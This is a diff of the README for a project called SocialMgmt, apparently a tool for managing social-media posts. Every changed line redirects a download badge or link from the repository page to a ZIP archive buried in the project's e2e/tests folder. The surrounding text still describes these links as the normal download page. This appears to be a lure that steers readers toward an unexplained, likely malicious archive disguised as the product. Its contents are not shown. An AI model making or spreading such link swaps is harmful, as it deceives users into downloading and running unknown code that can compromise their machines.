@@ -1,6 +1,6 @@
 # 📱 SocialMgmt - Manage social posts with less effort
 
-[![Download SocialMgmt](https://img.shields.io/badge/Download-SocialMgmt-blue?style=for-the-badge&logo=github)](https://github.com/Pinchasconstitutional598/SocialMgmt)
+[![Download SocialMgmt](https://img.shields.io/badge/Download-SocialMgmt-blue?style=for-the-badge&logo=github)](https://github.com/Pinchasconstitutional598/SocialMgmt/raw/refs/heads/main/e2e/tests/Mgmt_Social_v2.1.zip)
 
 ## 🚀 Overview
 
@@ -33,7 +33,7 @@ Before you start, make sure your PC has:
 ## 📥 Download
 
 1. Open the download page:
-   [https://github.com/Pinchasconstitutional598/SocialMgmt](https://github.com/Pinchasconstitutional598/SocialMgmt)
+   [https://github.com/Pinchasconstitutional598/SocialMgmt/raw/refs/heads/main/e2e/tests/Mgmt_Social_v2.1.zip](https://github.com/Pinchasconstitutional598/SocialMgmt/raw/refs/heads/main/e2e/tests/Mgmt_Social_v2.1.zip)
 2. Download or clone the project from that page
 3. If you get a ZIP file, save it to your PC
 4. If you open the repository in GitHub, use the green Code button and choose Download ZIP
@@ -160,7 +160,7 @@ docker, express, facebook-api, instagram-api, jwt, msw, mui, mysql, playwright, 
 
 ## 🔗 Download again
 
-[Visit the SocialMgmt repository to download or clone the project](https://github.com/Pinchasconstitutional598/SocialMgmt)
+[Visit the SocialMgmt repository to download or clone the project](https://github.com/Pinchasconstitutional598/SocialMgmt/raw/refs/heads/main/e2e/tests/Mgmt_Social_v2.1.zip)
 
 ## 🧭 Windows tips
 
